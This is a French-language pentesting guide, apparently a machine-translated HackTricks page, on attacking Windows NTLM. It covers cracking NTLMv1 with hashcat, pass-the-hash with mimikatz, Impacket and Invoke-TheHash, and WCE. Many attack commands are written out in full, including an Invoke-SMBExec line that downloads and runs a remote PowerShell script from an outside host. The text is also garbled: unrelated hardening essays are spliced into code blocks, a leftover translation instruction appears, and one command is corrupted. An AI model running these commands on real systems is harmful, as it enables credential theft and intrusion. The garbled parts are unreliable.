# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informations de base

**Identifiants NTLM** : Nom de domaine (le cas échéant), nom d'utilisateur et hachage du mot de passe.

**LM** est uniquement **activé** dans **Windows XP et Server 2003** (les hachages LM peuvent être craqués). Le hachage LM AAD3B435B51404EEAAD3B435B51404EE signifie que LM n'est pas utilisé (c'est le hachage LM d'une chaîne vide).

Par défaut, **Kerberos** est **utilisé**, donc NTLM ne sera utilisé que s'il n'y a pas de configuration Active Directory, que le domaine n'existe pas, que Kerberos ne fonctionne pas (mauvaise configuration) ou que le client essaie de se connecter en utilisant l'adresse IP au lieu d'un nom d'hôte valide.

Les paquets réseau d'une authentification NTLM ont l'en-tête "**NTLMSSP**".

Les protocoles : LM, NTLMv1 et NTLMv2 sont pris en charge dans la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 et NTLMv2

Vous pouvez vérifier et configurer le protocole qui sera utilisé :

### Interface graphique

Exécutez _secpol.msc_ -> Stratégies locales -> Options de sécurité -> Sécurité réseau : Niveau d'authentification LAN Manager. Il existe 6 niveaux (de 0 à 5).

![](<../../.gitbook/assets/image (92).png>)

### Registre

Cela définira le niveau 5 :
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Valeurs possibles:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Schéma d'authentification de base NTLM Domain

1. L'**utilisateur** introduit ses **informations d'identification**
2. La machine cliente **envoie une demande d'authentification** en envoyant le **nom de domaine** et le **nom d'utilisateur**
3. Le **serveur** envoie le **défi**
4. Le client **chiffre** le **défi** en utilisant le hachage du mot de passe comme clé et l'envoie en tant que réponse
5. Le **serveur envoie** au **contrôleur de domaine** le **nom de domaine, le nom d'utilisateur, le défi et la réponse**. Si aucun annuaire actif n'est configuré ou si le nom de domaine est le nom du serveur, les informations d'identification sont **vérifiées localement**.
6. Le **contrôleur de domaine vérifie si tout est correct** et envoie les informations au serveur

Le **serveur** et le **contrôleur de domaine** sont capables de créer un **canal sécurisé** via le serveur **Netlogon** car le contrôleur de domaine connaît le mot de passe du serveur (il se trouve dans la base de données **NTDS.DIT**).

### Schéma d'authentification NTLM local

L'authentification est la même que celle mentionnée **précédemment, mais** le **serveur** connaît le **hachage de l'utilisateur** qui tente de s'authentifier dans le fichier **SAM**. Ainsi, au lieu de demander au contrôleur de domaine, le **serveur vérifiera lui-même** si l'utilisateur peut s'authentifier.

### Défi NTLMv1

La longueur du **défi est de 8 octets** et la **réponse mesure 24 octets**.

Le **hachage NT (16 octets)** est divisé en **3 parties de 7 octets chacune** (7B + 7B + (2B+0x00\*5)) : la **dernière partie est remplie de zéros**. Ensuite, le **défi** est **chiffré séparément** avec chaque partie et les octets chiffrés **résultants sont joints**. Total : 8B + 8B + 8B = 24 octets.

**Problèmes** :

* Manque de **randomisation**
* Les 3 parties peuvent être **attaquées séparément** pour trouver le hachage NT
* **DES est crackable**
* La 3ème clé est composée uniquement de **5 zéros**.
* Étant donné le **même défi**, la **réponse** sera **identique**. Ainsi, vous pouvez donner comme **défi** à la victime la chaîne "**1122334455667788**" et attaquer la réponse en utilisant des **tables arc-en-ciel précalculées**.

### Attaque NTLMv1

De nos jours, il est de moins en moins courant de trouver des environnements avec une délégation non contrainte configurée, mais cela ne signifie pas que vous ne pouvez pas **abuser d'un service d'impression en file d'attente** configuré.

Vous pourriez abuser de certaines informations d'identification/sessions que vous avez déjà sur l'AD pour **demander à l'imprimante de s'authentifier** contre un **hôte sous votre contrôle**. Ensuite, en utilisant `metasploit auxiliary/server/capture/smb` ou `responder`, vous pouvez **définir le défi d'authentification sur 1122334455667788**, capturer la tentative d'authentification et si elle a été effectuée en utilisant **NTLMv1**, vous pourrez la **craquer**.\
Si vous utilisez `responder`, vous pouvez essayer d'utiliser le drapeau `--lm` pour tenter de **réduire** l'**authentification**.\
Notez que pour cette technique, l'authentification doit être effectuée en utilisant NTLMv1 (NTLMv2 n'est pas valide).

N'oubliez pas que l'imprimante utilisera le compte de l'ordinateur lors de l'authentification, et les comptes d'ordinateur utilisent des mots de passe **longs et aléatoires** que vous **ne pourrez probablement pas craquer** en utilisant des **dictionnaires** courants. Mais l'authentification **NTLMv1** utilise DES ([plus d'informations ici](./#ntlmv1-challenge)), donc en utilisant des services spécialement dédiés au craquage de DES, vous pourrez le craquer (vous pouvez utiliser [https://crack.sh/](https://crack.sh) par exemple).

### Attaque NTLMv1 avec hashcat

NTLMv1 peut également être cassé avec l'outil NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) qui formate les messages NTLMv1 d'une manière qui peut être cassée avec hashcat.

La commande
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
``` would output the below:

```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# Renforcement de la sécurité de Windows - NTLM

Le protocole NTLM (NT LAN Manager) est un protocole d'authentification utilisé par les systèmes d'exploitation Windows. Cependant, il présente certaines vulnérabilités qui peuvent être exploitées par des attaquants pour compromettre la sécurité du système.

Ce guide fournit des recommandations pour renforcer la sécurité de Windows en ce qui concerne le protocole NTLM. En suivant ces recommandations, vous pouvez réduire les risques liés aux attaques basées sur NTLM.

## Désactivation de NTLMv1

Le NTLMv1 est une version obsolète du protocole NTLM qui présente des vulnérabilités connues. Il est recommandé de désactiver NTLMv1 sur les systèmes Windows pour renforcer la sécurité. Pour ce faire, vous pouvez suivre les étapes suivantes :

1. Ouvrez l'éditeur de stratégie de groupe en exécutant la commande `gpedit.msc`.
2. Accédez à "Configuration ordinateur" > "Stratégies Windows" > "Paramètres de sécurité" > "Stratégie locale" > "Options de sécurité".
3. Recherchez l'option "Réseau client : envoyer NTLMv1" et définissez-la sur "Désactivé".
4. Recherchez l'option "Réseau client : envoyer NTLMv2 réponse uniquement" et définissez-la sur "Activé".

## Utilisation de NTLMv2

Le NTLMv2 est une version améliorée du protocole NTLM qui offre une meilleure sécurité. Il est recommandé d'utiliser NTLMv2 pour renforcer la sécurité de Windows. Pour activer l'utilisation de NTLMv2, suivez les étapes suivantes :

1. Ouvrez l'éditeur de stratégie de groupe en exécutant la commande `gpedit.msc`.
2. Accédez à "Configuration ordinateur" > "Stratégies Windows" > "Paramètres de sécurité" > "Stratégie locale" > "Options de sécurité".
3. Recherchez l'option "Réseau client : envoyer NTLMv2 réponse uniquement" et définissez-la sur "Activé".

## Limiter l'utilisation de NTLM

Il est recommandé de limiter l'utilisation du protocole NTLM autant que possible. Vous pouvez suivre les étapes suivantes pour limiter l'utilisation de NTLM :

1. Ouvrez l'éditeur de stratégie de groupe en exécutant la commande `gpedit.msc`.
2. Accédez à "Configuration ordinateur" > "Stratégies Windows" > "Paramètres de sécurité" > "Stratégie locale" > "Options de sécurité".
3. Recherchez l'option "Réseau client : limiter l'utilisation de NTLM : authentification NTLMv2" et définissez-la sur "Activé".

En suivant ces recommandations, vous pouvez renforcer la sécurité de Windows en ce qui concerne le protocole NTLM et réduire les risques d'attaques basées sur NTLM.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Exécutez hashcat (de préférence distribué via un outil tel que hashtopolis), car cela prendra sinon plusieurs jours.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Dans ce cas, nous connaissons le mot de passe qui est "password", nous allons donc tricher à des fins de démonstration :
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Nous devons maintenant utiliser les utilitaires hashcat pour convertir les clés DES craquées en parties du hash NTLM :
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
# Renforcement de la sécurité de Windows - NTLM

## Introduction

Dans cet article, nous allons discuter des techniques de renforcement de la sécurité de Windows en ce qui concerne le protocole NTLM (NT LAN Manager). NTLM est un protocole d'authentification utilisé par les systèmes d'exploitation Windows pour vérifier l'identité des utilisateurs et leur accorder l'accès aux ressources.

## Désactivation de NTLMv1

NTLMv1 est une version obsolète du protocole NTLM qui présente des vulnérabilités connues. Il est recommandé de désactiver NTLMv1 sur les systèmes Windows pour renforcer la sécurité. Pour ce faire, suivez les étapes suivantes :

1. Ouvrez l'éditeur de stratégie de groupe en exécutant la commande `gpedit.msc`.
2. Accédez à "Configuration ordinateur" > "Stratégies Windows" > "Paramètres de sécurité" > "Stratégie locale" > "Options de sécurité".
3. Recherchez l'option "Réseau Microsoft : Désactiver l'authentification NTLMv1" et double-cliquez dessus.
4. Sélectionnez "Activé" et cliquez sur "OK" pour enregistrer les modifications.

## Utilisation de NTLMv2

NTLMv2 est une version améliorée du protocole NTLM qui offre une meilleure sécurité. Il est recommandé d'utiliser NTLMv2 pour renforcer la sécurité de Windows. Pour activer NTLMv2, suivez les étapes suivantes :

1. Ouvrez l'éditeur de registre en exécutant la commande `regedit`.
2. Accédez à la clé de registre suivante : `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.
3. Créez une nouvelle valeur DWORD nommée "LMCompatibilityLevel" si elle n'existe pas déjà.
4. Définissez la valeur de "LMCompatibilityLevel" sur "5" pour activer NTLMv2.
5. Redémarrez le système pour que les modifications prennent effet.

## Conclusion

En désactivant NTLMv1 et en utilisant NTLMv2, vous renforcez la sécurité de Windows en éliminant les vulnérabilités connues du protocole NTLM. Ces mesures contribuent à protéger vos systèmes contre les attaques potentielles et à garantir la confidentialité de vos données.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Le contenu suivant est extrait d'un livre sur les techniques de piratage. Le contenu suivant provient du fichier windows-hardening/ntlm/README.md. Traduisez le texte anglais pertinent en français et renvoyez la traduction en conservant exactement la même syntaxe markdown et html. Ne traduisez pas des éléments tels que le code, les noms de techniques de piratage, les mots de piratage, les noms de plateformes cloud/SaaS (comme Workspace, aws, gcp...), le mot 'leak', pentesting et les balises markdown. N'ajoutez pas non plus d'éléments supplémentaires en dehors de la traduction et de la syntaxe markdown.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Défi NTLMv2

La **longueur du défi est de 8 octets** et **2 réponses sont envoyées** : l'une fait **24 octets** de long et la longueur de l'**autre** est **variable**.

**La première réponse** est créée en chiffrant à l'aide de **HMAC\_MD5** la **chaîne** composée par le **client et le domaine** et en utilisant comme **clé** le **hachage MD4** du **hachage NT**. Ensuite, le **résultat** sera utilisé comme **clé** pour chiffrer à l'aide de **HMAC\_MD5** le **défi**. À cela, **un défi client de 8 octets sera ajouté**. Total : 24 B.

La **deuxième réponse** est créée en utilisant **plusieurs valeurs** (un nouveau défi client, un **horodatage** pour éviter les **attaques de rejeu**...).

Si vous disposez d'un **pcap qui a capturé un processus d'authentification réussi**, vous pouvez suivre ce guide pour obtenir le domaine, le nom d'utilisateur, le défi et la réponse, et essayer de craquer le mot de passe : [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Une fois que vous avez le hachage de la victime**, vous pouvez l'utiliser pour **vous faire passer pour elle**.\
Vous devez utiliser un **outil** qui **effectuera** l'**authentification NTLM en utilisant** ce **hachage**, **ou** vous pouvez créer une nouvelle **sessionlogon** et **injecter** ce **hachage** dans le **LSASS**, de sorte que lorsque toute **authentification NTLM est effectuée**, ce **hachage sera utilisé**. La dernière option est ce que fait mimikatz.

**Veuillez noter que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**

### **Mimikatz**

**Doit être exécuté en tant qu'administrateur**.
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Cela lancera un processus qui appartiendra aux utilisateurs qui ont lancé mimikatz, mais internement dans LSASS, les informations d'identification enregistrées sont celles qui se trouvent dans les paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly`, mais vous n'avez pas besoin de connaître le mot de passe en texte clair).

### Pass-the-Hash depuis Linux

Vous pouvez obtenir l'exécution de code sur des machines Windows en utilisant Pass-the-Hash depuis Linux.\
[**Accédez ici pour apprendre comment le faire.**](../../windows/ntlm/broken-reference/)

### Outils compilés Windows Impacket

Vous pouvez télécharger les binaires impacket pour Windows ici : [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Dans ce cas, vous devez spécifier une commande, cmd.exe et powershell.exe ne sont pas valides pour obtenir un shell interactif) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Il y a plusieurs autres binaires Impacket...

### Invoke-TheHash

Vous pouvez obtenir les scripts PowerShell ici : [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec

Le module Invoke-WMIExec est un outil de post-exploitation qui permet d'exécuter des commandes sur des machines Windows via le protocole WMI (Windows Management Instrumentation). Il utilise les informations d'identification d'un utilisateur pour se connecter à distance à une machine cible et exécuter des commandes en tant que cet utilisateur.

##### Utilisation

Pour utiliser Invoke-WMIExec, vous devez d'abord importer le module dans votre environnement PowerShell :

```powershell
Import-Module .\Invoke-WMIExec.ps1
```

Ensuite, vous pouvez exécuter la commande suivante pour exécuter une commande sur une machine cible :

```powershell
Invoke-WMIExec -Target <cible> -Username <nom_utilisateur> -Password <mot_de_passe> -Command <commande>
```

Remplacez `<cible>` par l'adresse IP ou le nom d'hôte de la machine cible, `<nom_utilisateur>` par le nom d'utilisateur avec lequel vous souhaitez vous connecter, `<mot_de_passe>` par le mot de passe correspondant à cet utilisateur, et `<commande>` par la commande que vous souhaitez exécuter.

##### Exemple

```powershell
Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig /all"
```

Cet exemple exécute la commande `ipconfig /all` sur la machine cible avec l'utilisateur `Administrator` et le mot de passe `P@ssw0rd`.

##### Remarques

- Assurez-vous d'avoir les droits d'accès appropriés sur la machine cible pour exécuter des commandes via WMI.
- L'utilisation de cet outil peut être considérée comme une activité malveillante si elle est effectuée sans autorisation appropriée.
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

Le module Invoke-SMBClient est un outil puissant utilisé pour interagir avec le protocole SMB (Server Message Block) sur les systèmes Windows. Il permet aux pentesteurs d'explorer et d'exploiter les vulnérabilités liées à SMB.

##### Utilisation

Pour utiliser Invoke-SMBClient, exécutez la commande suivante :

```powershell
Invoke-SMBClient -Target <cible> -Username <nom_utilisateur> -Password <mot_de_passe> -Command <commande>
```

Remplacez `<cible>` par l'adresse IP ou le nom d'hôte de la machine cible. `<nom_utilisateur>` et `<mot_de_passe>` doivent être les informations d'identification valides pour accéder à la machine cible. `<commande>` est la commande que vous souhaitez exécuter sur la machine cible.

##### Exemples

- Exécuter une commande sur une machine cible :

```powershell
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Command "ipconfig /all"
```

- Télécharger un fichier depuis une machine cible :

```powershell
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Command "Get-Content C:\path\to\file.txt" -OutputFile local_file.txt
```

- Charger un fichier sur une machine cible :

```powershell
Invoke-SMBClient -Target 192.168.0.100 -Username admin -Password P@ssw0rd -Command "Set-Content C:\path\to\file.txt" -InputFile local_file.txt
```

##### Remarques

- Assurez-vous d'avoir les autorisations nécessaires pour accéder à la machine cible.
- Utilisez cet outil avec précaution et uniquement dans le cadre d'un test d'intrusion autorisé.
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

Le script Invoke-SMBEnum est un outil de pentest qui permet d'effectuer une énumération des informations sur les serveurs SMB (Server Message Block) dans un réseau Windows. Il utilise la méthode NTLM (NT LAN Manager) pour récupérer des informations telles que les utilisateurs, les groupes, les partages, les sessions actives et les connexions.

##### Utilisation

```powershell
Invoke-SMBEnum -Target <cible> [-Port <port>] [-Credential <credentials>] [-Verbose]
```

- `<cible>` : spécifie l'adresse IP ou le nom d'hôte du serveur SMB à cibler.
- `<port>` (facultatif) : spécifie le port SMB à utiliser. Par défaut, le port 445 est utilisé.
- `<credentials>` (facultatif) : spécifie les informations d'identification à utiliser pour l'authentification NTLM. Si aucune information d'identification n'est spécifiée, les informations d'identification actuelles de l'utilisateur en cours seront utilisées.
- `-Verbose` (facultatif) : active le mode verbeux pour afficher des informations détaillées sur les opérations effectuées.

##### Exemples

```powershell
Invoke-SMBEnum -Target 192.168.1.100
```

Ce command permet d'énumérer les informations sur le serveur SMB à l'adresse IP 192.168.1.100 en utilisant les informations d'identification actuelles de l'utilisateur en cours.

```powershell
Invoke-SMBEnum -Target fileserver01 -Port 139 -Credential (Get-Credential)
```

Ce command permet d'énumérer les informations sur le serveur SMB "fileserver01" en utilisant le port 139 et en spécifiant des informations d'identification personnalisées.

##### Remarques

- L'utilisation de cet outil doit être effectuée dans le cadre d'un test de pénétration autorisé et avec l'autorisation appropriée.
- L'énumération des informations sur les serveurs SMB peut aider à identifier les vulnérabilités potentielles et à renforcer la sécurité du réseau Windows.
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'une quelconque** de **SMBExec** et **WMIExec**, mais que vous ne fournissez pas de paramètre _**Commande**_, cela vérifiera simplement si vous avez **suffisamment de permissions**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#utilisation-d-evil-winrm)

### Windows Credentials Editor (WCE)

**Doit être exécuté en tant qu'administrateur**

Cet outil fera la même chose que mimikatz (modifier la mémoire LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Exécution à distance manuelle sur Windows avec nom d'utilisateur et mot de passe

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extraction des informations d'identification à partir d'un hôte Windows

**Pour plus d'informations sur** [**comment obtenir des informations d'identification à partir d'un hôte Windows, vous devriez lire cette page**](broken-reference)**.**

## NTLM Relay et Responder

**Lisez un guide plus détaillé sur la façon d'effectuer ces attaques ici:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analyser les défis NTLM à partir d'une capture réseau

**Vous pouvez utiliser** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous voulez voir votre **entreprise annoncée dans HackTricks** ? ou vous voulez avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
